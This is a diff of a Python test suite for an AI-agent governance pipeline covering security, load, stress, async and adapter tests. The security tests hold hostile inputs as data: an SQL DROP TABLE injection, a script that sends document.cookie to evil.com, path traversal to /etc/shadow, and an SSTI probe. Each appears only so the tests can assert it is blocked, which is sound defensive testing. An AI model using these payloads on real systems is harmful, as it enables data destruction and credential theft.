@@ -33,20 +33,27 @@ _ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 if _ROOT not in sys.path:
     sys.path.insert(0, _ROOT)
 
-from glassbox.governance.audit_logger    import AuditLogger
-from glassbox.governance.models          import (
-    AgentContract, DecisionContext, DecisionRequest, DecisionType,
-    FinalStatus, RetryConfig, RetryStrategy,
+from glassbox.governance.audit_logger import AuditLogger
+from glassbox.governance.models import (
+    AgentContract,
+    DecisionContext,
+    DecisionRequest,
+    DecisionType,
+    FinalStatus,
+    RetryConfig,
+    RetryStrategy,
 )
-from glassbox.governance.pipeline        import GovernancePipeline
-from glassbox.governance.policy_engine   import PolicyEngine
+from glassbox.governance.pipeline import GovernancePipeline
+from glassbox.governance.policy_engine import PolicyEngine
 from glassbox.governance.velocity_breaker import VelocityBreaker
-from glassbox.security.sanitizer         import (
-    PayloadSanitizer, SecurityReport, validate_agent_id,
+from glassbox.security.sanitizer import (
+    PayloadSanitizer,
+    SecurityReport,
+    validate_agent_id,
 )
-
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
+
 
 def _pipe(**kwargs) -> GovernancePipeline:
     return GovernancePipeline(echo=False, **kwargs)
@@ -63,6 +70,7 @@ def _proc(agent="load_agent", amount=5000):
 # ══════════════════════════════════════════════════════════════════════════════
 # SECURITY INJECTION TESTS
 # ══════════════════════════════════════════════════════════════════════════════
+
 
 class TestSecuritySQLInjection(unittest.TestCase):
     """Validate that SQL injection payloads are detected and blocked."""
@@ -142,53 +150,74 @@ class TestSecurityPipelineIntegration(unittest.TestCase):
         self.p = _pipe()
 
     def test_sql_injection_blocked_at_pipeline(self):
-        r = self.p.process(DecisionRequest(
-            "agent_sec", DecisionType.PROCUREMENT,
-            {"amount": 1000, "supplier_id": "SUP-001'; DROP TABLE suppliers;--",
-             "category": "hardware"},
-        ))
+        r = self.p.process(
+            DecisionRequest(
+                "agent_sec",
+                DecisionType.PROCUREMENT,
+                {
+                    "amount": 1000,
+                    "supplier_id": "SUP-001'; DROP TABLE suppliers;--",
+                    "category": "hardware",
+                },
+            )
+        )
         self.assertEqual(r.final_status, FinalStatus.BLOCKED)
         self.assertTrue(any("SECURITY-001" in v for v in r.policy_violations))
 
     def test_script_injection_blocked_at_pipeline(self):
-        r = self.p.process(DecisionRequest(
-            "agent_sec", DecisionType.CUSTOM,
-            {"description": "<script>fetch('https://evil.com?c='+document.cookie)</script>"},
-        ))
+        r = self.p.process(
+            DecisionRequest(
+                "agent_sec",
+                DecisionType.CUSTOM,
+                {"description": "<script>fetch('https://evil.com?c='+document.cookie)</script>"},
+            )
+        )
         self.assertEqual(r.final_status, FinalStatus.BLOCKED)
 
     def test_null_byte_in_agent_id_blocked(self):
-        r = self.p.process(DecisionRequest(
-            "agent\x00admin", DecisionType.PROCUREMENT,
-            {"amount": 1000},
-        ))
+        r = self.p.process(
+            DecisionRequest(
+                "agent\x00admin",
+                DecisionType.PROCUREMENT,
+                {"amount": 1000},
+            )
+        )
         self.assertEqual(r.final_status, FinalStatus.BLOCKED)
         self.assertTrue(any("SECURITY-001" in v for v in r.policy_violations))
 
     def test_invalid_agent_id_blocked(self):
-        r = self.p.process(DecisionRequest(
-            "../../../etc/passwd", DecisionType.PROCUREMENT,
-            {"amount": 1000},
-        ))
+        r = self.p.process(
+            DecisionRequest(
+                "../../../etc/passwd",
+                DecisionType.PROCUREMENT,
+                {"amount": 1000},
+            )
+        )
         self.assertEqual(r.final_status, FinalStatus.BLOCKED)
 
     def test_path_traversal_in_payload_blocked(self):
-        r = self.p.process(DecisionRequest(
-            "agent_sec", DecisionType.IT_OPS,
-            {"action": "read_file", "target": "../../../../etc/shadow"},
-        ))
+        r = self.p.process(
+            DecisionRequest(
+                "agent_sec",
+                DecisionType.IT_OPS,
+                {"action": "read_file", "target": "../../../../etc/shadow"},
+            )
+        )
         self.assertEqual(r.final_status, FinalStatus.BLOCKED)
 
     def test_clean_payload_not_affected_by_security(self):
-        r = self.p.process(DecisionRequest(
-            "agent_clean", DecisionType.PROCUREMENT,
-            {"amount": 5000, "supplier_id": "SUP-001", "category": "hardware"},
-        ))
+        r = self.p.process(
+            DecisionRequest(
+                "agent_clean",
+                DecisionType.PROCUREMENT,
+                {"amount": 5000, "supplier_id": "SUP-001", "category": "hardware"},
+            )
+        )
         self.assertEqual(r.final_status, FinalStatus.EXECUTED)
 
     def test_oversized_payload_flagged(self):
         san = PayloadSanitizer(max_payload_size=100)
-        p   = _pipe(sanitizer=san)
+        p = _pipe(sanitizer=san)
         big_payload = {"data": "x" * 200, "amount": 1000}
         report = san.check(big_payload)
         # Size finding should be present
@@ -233,6 +262,7 @@ class TestAgentIdValidation(unittest.TestCase):
 # LOAD TESTS — Sustained throughput
 # ══════════════════════════════════════════════════════════════════════════════
 
+
 class TestLoadSustained(unittest.TestCase):
     """Sustained load: verify stable throughput and zero errors over time."""
 
@@ -250,14 +280,26 @@ class TestLoadSustained(unittest.TestCase):
     def test_all_decision_types_no_errors(self):
         p = _pipe()
         cases = [
-            (DecisionType.PROCUREMENT, {"amount": 5000, "supplier_id": "SUP-001", "category": "hw"}),
-            (DecisionType.PRICING,     {"new_price": 110.0, "previous_price": 100.0, "product_id": "P1"}),
-            (DecisionType.FINANCIAL,   {"amount": 15000, "destination_account": "ACC", "reference": "R1"}),
-            (DecisionType.INVENTORY,   {"quantity": 500, "product_id": "SKU-001"}),
-            (DecisionType.LOGISTICS,   {"origin": "MUM", "destination": "DEL", "shipment_value": 5000}),
-            (DecisionType.IT_OPS,      {"action": "restart_service", "target": "svc"}),
-            (DecisionType.HR,          {"action": "address_update", "employee_id": "EMP-001"}),
-            (DecisionType.CUSTOM,      {"description": "load test decision"}),
+            (
+                DecisionType.PROCUREMENT,
+                {"amount": 5000, "supplier_id": "SUP-001", "category": "hw"},
+            ),
+            (
+                DecisionType.PRICING,
+                {"new_price": 110.0, "previous_price": 100.0, "product_id": "P1"},
+            ),
+            (
+                DecisionType.FINANCIAL,
+                {"amount": 15000, "destination_account": "ACC", "reference": "R1"},
+            ),
+            (DecisionType.INVENTORY, {"quantity": 500, "product_id": "SKU-001"}),
+            (
+                DecisionType.LOGISTICS,
+                {"origin": "MUM", "destination": "DEL", "shipment_value": 5000},
+            ),
+            (DecisionType.IT_OPS, {"action": "restart_service", "target": "svc"}),
+            (DecisionType.HR, {"action": "address_update", "employee_id": "EMP-001"}),
+            (DecisionType.CUSTOM, {"description": "load test decision"}),
         ]
         errors = []
         for _ in range(100):
@@ -274,7 +316,9 @@ class TestLoadSustained(unittest.TestCase):
             p.process(_proc())
         s = p.stats
         self.assertIsNotNone(s["avg_latency_ms"])
-        self.assertLess(s["avg_latency_ms"], 5.0, f"Avg latency SLA breach: {s['avg_latency_ms']}ms")
+        self.assertLess(
+            s["avg_latency_ms"], 5.0, f"Avg latency SLA breach: {s['avg_latency_ms']}ms"
+        )
 
     def test_p99_latency_under_sla_50ms(self):
         p = _pipe()
@@ -289,14 +333,15 @@ class TestLoadSustained(unittest.TestCase):
 # STRESS TESTS — Beyond design capacity, verify graceful degradation
 # ══════════════════════════════════════════════════════════════════════════════
 
+
 class TestStress(unittest.TestCase):
     """Stress: verify no crashes, no data corruption under extreme load."""
 
     def test_100_thread_stress_no_errors(self):
-        p   = _pipe(max_memory_records=20000)
+        p = _pipe(max_memory_records=20000)
         errors = []
-        lock   = threading.Lock()
-        ids    = []
+        lock = threading.Lock()
+        ids = []
 
         def worker(tid):
             for i in range(50):
@@ -309,8 +354,10 @@ class TestStress(unittest.TestCase):
                         errors.append(str(exc))
 
         threads = [threading.Thread(target=worker, args=(i,)) for i in range(100)]
-        for t in threads: t.start()
-        for t in threads: t.join()
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
 
         self.assertEqual(len(errors), 0, f"Stress errors: {errors[:5]}")
         self.assertEqual(len(set(ids)), len(ids), "Duplicate decision IDs under stress!")
@@ -320,19 +367,21 @@ class TestStress(unittest.TestCase):
     def test_velocity_breaker_under_stress(self):
         """Under stress, velocity breaker must never let a trip go undetected."""
         vb = VelocityBreaker(max_decisions=10, window_seconds=60, cooldown_seconds=0)
-        p  = _pipe(velocity_breaker=vb)
+        p = _pipe(velocity_breaker=vb)
         results = []
         lock = threading.Lock()
 
         def burst(tid):
-            for _ in range(15):   # 15 > 10 limit
+            for _ in range(15):  # 15 > 10 limit
                 r = p.process(_proc(f"stress_vel_{tid}", 500))
                 with lock:
                     results.append(r.final_status)
 
         threads = [threading.Thread(target=burst, args=(i,)) for i in range(5)]
-        for t in threads: t.start()
-        for t in threads: t.join()
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
 
         # At least some decisions must have been blocked per-agent
         blocked = sum(1 for s in results if s == FinalStatus.BLOCKED)
@@ -345,8 +394,9 @@ class TestStress(unittest.TestCase):
         for i in range(max_records * 3):
             p.process(_proc(f"mem_{i % 5}", 500))
         actual = len(p.audit_logger.get_all())
-        self.assertLessEqual(actual, max_records,
-            f"Memory ring buffer overflow: {actual} > {max_records}")
+        self.assertLessEqual(
+            actual, max_records, f"Memory ring buffer overflow: {actual} > {max_records}"
+        )
 
     def test_policy_engine_concurrent_register_and_evaluate(self):
         """Concurrent register+evaluate must never crash the policy engine."""
@@ -359,10 +409,18 @@ class TestStress(unittest.TestCase):
 
         def register_custom(i):
             try:
+
                 def rule(p, ctx):
                     return PolicyEvaluation(f"CUSTOM-{i}", f"Custom {i}", "pass", "ok")
-                pe.register(Policy(policy_id=f"CUSTOM-{i}", policy_name=f"Custom {i}",
-                                   decision_types=[DecisionType.CUSTOM], rule=rule))
+
+                pe.register(
+                    Policy(
+                        policy_id=f"CUSTOM-{i}",
+                        policy_name=f"Custom {i}",
+                        decision_types=[DecisionType.CUSTOM],
+                        rule=rule,
+                    )
+                )
             except Exception as exc:
                 with lock:
                     errors.append(str(exc))
@@ -376,12 +434,13 @@ class TestStress(unittest.TestCase):
                 with lock:
                     errors.append(str(exc))
 
-        threads = (
-            [threading.Thread(target=register_custom, args=(i,)) for i in range(20)] +
-            [threading.Thread(target=evaluate_batch) for _ in range(10)]
-        )
-        for t in threads: t.start()
-        for t in threads: t.join()
+        threads = [threading.Thread(target=register_custom, args=(i,)) for i in range(20)] + [
+            threading.Thread(target=evaluate_batch) for _ in range(10)
+        ]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
         self.assertEqual(len(errors), 0, f"Policy engine concurrent errors: {errors}")
 
     def test_multi_instance_isolation(self):
@@ -392,20 +451,35 @@ class TestStress(unittest.TestCase):
         # Block PROC-001 on p1 only
         p1.policy_engine.disable("PROC-001")
 
-        r1 = p1.process(DecisionRequest("a1", DecisionType.PROCUREMENT,
-            {"amount": 700000, "supplier_id": "SUP-001", "category": "hardware"}))
-        r2 = p2.process(DecisionRequest("a1", DecisionType.PROCUREMENT,
-            {"amount": 700000, "supplier_id": "SUP-001", "category": "hardware"}))
+        r1 = p1.process(
+            DecisionRequest(
+                "a1",
+                DecisionType.PROCUREMENT,
+                {"amount": 700000, "supplier_id": "SUP-001", "category": "hardware"},
+            )
+        )
+        r2 = p2.process(
+            DecisionRequest(
+                "a1",
+                DecisionType.PROCUREMENT,
+                {"amount": 700000, "supplier_id": "SUP-001", "category": "hardware"},
+            )
+        )
 
         # p2 must still enforce PROC-001 — p1's disable must not affect p2
-        self.assertEqual(r1.final_status, FinalStatus.EXECUTED,
-            "p1 should execute (PROC-001 disabled)")
-        self.assertEqual(r2.final_status, FinalStatus.BLOCKED,
-            "p2 must block (PROC-001 still active) — instance isolation breach!")
+        self.assertEqual(
+            r1.final_status, FinalStatus.EXECUTED, "p1 should execute (PROC-001 disabled)"
+        )
+        self.assertEqual(
+            r2.final_status,
+            FinalStatus.BLOCKED,
+            "p2 must block (PROC-001 still active) — instance isolation breach!",
+        )
 
     def test_no_shared_policy_state_between_instances(self):
         """Deep-copy in PolicyEngine must prevent cross-instance mutation."""
         from glassbox.governance.policy_engine import PolicyEngine
+
         pe1 = PolicyEngine()
         pe2 = PolicyEngine()
         pe1.disable("PROC-001")
@@ -418,14 +492,15 @@ class TestStress(unittest.TestCase):
 # SPIKE TESTS — Sudden burst
 # ══════════════════════════════════════════════════════════════════════════════
 
+
 class TestSpike(unittest.TestCase):
     """Spike: verify that sudden burst traffic is handled without crashing."""
 
     def test_burst_500_simultaneous_threads(self):
         """500 simultaneous threads submitting one decision each."""
-        p      = _pipe(max_memory_records=1000, async_workers=32)
+        p = _pipe(max_memory_records=1000, async_workers=32)
         errors = []
-        lock   = threading.Lock()
+        lock = threading.Lock()
 
         def submit(i):
             try:
@@ -444,35 +519,39 @@ class TestSpike(unittest.TestCase):
     def test_burst_then_normal_throughput_restored(self):
         """After a velocity burst, normal traffic resumes after per-agent reset."""
         vb = VelocityBreaker(max_decisions=5, window_seconds=60, cooldown_seconds=0)
-        p  = _pipe(velocity_breaker=vb)
+        p = _pipe(velocity_breaker=vb)
         for _ in range(7):
             p.process(_proc("spike_agent"))
         vb.reset("spike_agent")
         r = p.process(_proc("spike_agent"))
-        self.assertFalse(r.circuit_breaker_triggered,
-            "After reset, normal traffic must flow again")
+        self.assertFalse(r.circuit_breaker_triggered, "After reset, normal traffic must flow again")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
 # ASYNC PIPELINE TESTS
 # ══════════════════════════════════════════════════════════════════════════════
 
+
 class TestAsyncPipeline(unittest.TestCase):
     """Validate that process_async() is safe and produces correct results."""
 
     def test_async_single_decision(self):
         p = _pipe()
+
         async def go():
             return await p.process_async(_proc())
+
         r = asyncio.run(go())
         self.assertIsNotNone(r.final_status)
         self.assertEqual(r.final_status, FinalStatus.EXECUTED)
 
     def test_async_concurrent_50_decisions(self):
         p = _pipe()
+
         async def go():
             tasks = [p.process_async(_proc(f"async_{i}")) for i in range(50)]
             return await asyncio.gather(*tasks)
+
         results = asyncio.run(go())
         self.assertEqual(len(results), 50)
         ids = [r.decision_id for r in results]
@@ -480,21 +559,29 @@ class TestAsyncPipeline(unittest.TestCase):
 
     def test_async_blocked_decision(self):
         p = _pipe()
+
         async def go():
-            return await p.process_async(DecisionRequest(
-                "async_block", DecisionType.PROCUREMENT,
-                {"amount": 700000, "category": "hardware"}
-            ))
+            return await p.process_async(
+                DecisionRequest(
+                    "async_block",
+                    DecisionType.PROCUREMENT,
+                    {"amount": 700000, "category": "hardware"},
+                )
+            )
+
         r = asyncio.run(go())
         self.assertEqual(r.final_status, FinalStatus.BLOCKED)
 
     def test_async_security_injection_blocked(self):
         p = _pipe()
+
         async def go():
-            return await p.process_async(DecisionRequest(
-                "async_sec", DecisionType.CUSTOM,
-                {"description": "{{7*7}} SSTI injection test"}
-            ))
+            return await p.process_async(
+                DecisionRequest(
+                    "async_sec", DecisionType.CUSTOM, {"description": "{{7*7}} SSTI injection test"}
+                )
+            )
+
         r = asyncio.run(go())
         self.assertEqual(r.final_status, FinalStatus.BLOCKED)
 
@@ -507,6 +594,7 @@ class TestAsyncPipeline(unittest.TestCase):
             tasks = []
             for i in range(20):
                 tasks.append(p.process_async(_proc(f"el_{i}")))
+
             # Run a counter task alongside — it must complete without starvation
             async def counter():
                 count = 0
@@ -536,12 +624,14 @@ class TestAsyncPipeline(unittest.TestCase):
 # PLATFORM ADAPTER TESTS
 # ══════════════════════════════════════════════════════════════════════════════
 
+
 class TestPlatformAdapters(unittest.TestCase):
     """Validate platform adapters create correct configurations."""
 
     def test_base_adapter_creates_pipeline(self):
         from glassbox.adapters.platforms import BaseAdapter
-        adapter  = BaseAdapter()
+
+        adapter = BaseAdapter()
         pipeline = adapter.create_pipeline()
         self.assertIsNotNone(pipeline)
         r = pipeline.process(_proc())
@@ -549,25 +639,29 @@ class TestPlatformAdapters(unittest.TestCase):
 
     def test_databricks_adapter_config(self):
         from glassbox.adapters.platforms import DatabricksAdapter
+
         adapter = DatabricksAdapter()
-        cfg     = adapter.get_config()
+        cfg = adapter.get_config()
         self.assertIn("log_dir", cfg)
         self.assertIn("environment", cfg)
 
     def test_kubernetes_adapter_config(self):
         from glassbox.adapters.platforms import KubernetesAdapter
+
         adapter = KubernetesAdapter()
-        cfg     = adapter.get_config()
+        cfg = adapter.get_config()
         self.assertEqual(cfg["log_dir"], "/var/log/glassbox")
 
     def test_fabric_adapter_config(self):
         from glassbox.adapters.platforms import FabricAdapter
+
         adapter = FabricAdapter()
-        cfg     = adapter.get_config()
+        cfg = adapter.get_config()
         self.assertIn("log_dir", cfg)
 
     def test_auto_detect_returns_adapter(self):
         from glassbox.adapters.platforms import auto_detect_adapter
+
         adapter = auto_detect_adapter()
         self.assertIsNotNone(adapter)
         pipeline = adapter.create_pipeline()
@@ -576,14 +670,16 @@ class TestPlatformAdapters(unittest.TestCase):
 
     def test_kubernetes_readiness_check(self):
         from glassbox.adapters.platforms import KubernetesAdapter
-        adapter  = KubernetesAdapter()
+
+        adapter = KubernetesAdapter()
         pipeline = adapter.create_pipeline()
-        check    = adapter.readiness_check(pipeline)
+        check = adapter.readiness_check(pipeline)
         self.assertIn("ready", check)
         self.assertTrue(check["ready"])
 
     def test_kubernetes_liveness_check(self):
         from glassbox.adapters.platforms import KubernetesAdapter
+
         check = KubernetesAdapter().liveness_check()
         self.assertTrue(check["alive"])
 
@@ -591,6 +687,7 @@ class TestPlatformAdapters(unittest.TestCase):
 # ══════════════════════════════════════════════════════════════════════════════
 # MEMORY PRESSURE TESTS
 # ══════════════════════════════════════════════════════════════════════════════
+
 
 class TestMemoryPressure(unittest.TestCase):
     """Validate that bounded ring buffer prevents memory exhaustion."""
@@ -607,8 +704,10 @@ class TestMemoryPressure(unittest.TestCase):
         records = p.audit_logger.get_all()
         self.assertLessEqual(len(records), max_records)
         # First record should have been evicted
-        self.assertIsNone(p.audit_logger.get_by_id(first_id),
-            "Oldest record should be evicted from ring buffer when full")
+        self.assertIsNone(
+            p.audit_logger.get_by_id(first_id),
+            "Oldest record should be evicted from ring buffer when full",
+        )
 
     def test_gc_after_large_run(self):
         """Pipeline must not retain hard references after decisions are evicted."""
@@ -624,62 +723,63 @@ class TestMemoryPressure(unittest.TestCase):
 # FILE I/O THREAD SAFETY
 # ══════════════════════════════════════════════════════════════════════════════
 
+
 class TestAuditLoggerFileSafety(unittest.TestCase):
-    """Validate concurrent file writes don't corrupt JSONL output."""
+    """Validate concurrent writes don't corrupt in-memory audit records.
 
-    def test_concurrent_file_writes_produce_valid_jsonl(self):
-        import json
-        import tempfile
-        with tempfile.TemporaryDirectory() as tmpdir:
-            p = GovernancePipeline(echo=False, log_dir=tmpdir,
-                                   max_memory_records=500)
-            errors = []
-            lock   = threading.Lock()
+    GB-040: the JSONL audit sink this test used to validate was removed
+    (plain-text audit output is not tamper-evident, contradicting the
+    "immutable audit trail" claim -- docs/CLAIMS.md \u00a71 claim 1). The
+    equivalent invariant -- concurrent writers never lose or corrupt a
+    record -- is now checked against the in-memory ring buffer that remains.
+    """
 
-            def write_batch(tid):
-                for i in range(20):
-                    try:
-                        p.process(_proc(f"file_{tid}", 500 + i))
-                    except Exception as exc:
-                        with lock:
-                            errors.append(str(exc))
+    def test_concurrent_writes_produce_one_record_per_decision(self):
+        p = GovernancePipeline(echo=False, max_memory_records=500)
+        errors = []
+        lock = threading.Lock()
 
-            threads = [threading.Thread(target=write_batch, args=(i,))
-                       for i in range(10)]
-            for t in threads: t.start()
-            for t in threads: t.join()
+        def write_batch(tid):
+            for i in range(20):
+                try:
+                    p.process(_proc(f"file_{tid}", 500 + i))
+                except Exception as exc:
+                    with lock:
+                        errors.append(str(exc))
 
-            self.assertEqual(len(errors), 0)
+        threads = [threading.Thread(target=write_batch, args=(i,)) for i in range(10)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
 
-            # Validate all JSONL lines are parseable
-            from pathlib import Path
-            jsonl_files = list(Path(tmpdir).glob("*.jsonl"))
-            self.assertGreater(len(jsonl_files), 0, "No JSONL files created")
-            bad_lines = 0
-            total_lines = 0
-            for fp in jsonl_files:
-                for line in fp.read_text().strip().splitlines():
-                    total_lines += 1
-                    try:
-                        json.loads(line)
-                    except json.JSONDecodeError:
-                        bad_lines += 1
-            self.assertEqual(bad_lines, 0,
-                f"{bad_lines} of {total_lines} JSONL lines are invalid JSON — concurrent write corruption!")
-            self.assertGreaterEqual(total_lines, 150)
+        self.assertEqual(len(errors), 0)
+
+        records = p.audit_logger.get_all()
+        self.assertEqual(len(records), 200, "a concurrent write lost or duplicated a decision")
+        decision_ids = {rec.to_dict()["decision_id"] for rec in records}
+        self.assertEqual(len(decision_ids), 200, "a concurrent write corrupted a decision_id")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
 # HEALTH CHECK
 # ══════════════════════════════════════════════════════════════════════════════
 
+
 class TestHealthCheck(unittest.TestCase):
     def test_health_returns_correct_structure(self):
         p = _pipe()
         p.process(_proc())
         h = p.health()
-        for key in ["status", "service", "version", "environment",
-                    "total_decisions", "block_rate_pct", "policies"]:
+        for key in [
+            "status",
+            "service",
+            "version",
+            "environment",
+            "total_decisions",
+            "block_rate_pct",
+            "policies",
+        ]:
             self.assertIn(key, h, f"Missing health key: {key}")
         self.assertEqual(h["status"], "healthy")
         self.assertEqual(h["total_decisions"], 1)
@@ -691,7 +791,7 @@ class TestHealthCheck(unittest.TestCase):
 
 if __name__ == "__main__":
     loader = unittest.TestLoader()
-    suite  = unittest.TestSuite()
+    suite = unittest.TestSuite()
     classes = [
         TestSecuritySQLInjection,
         TestSecurityScriptInjection,
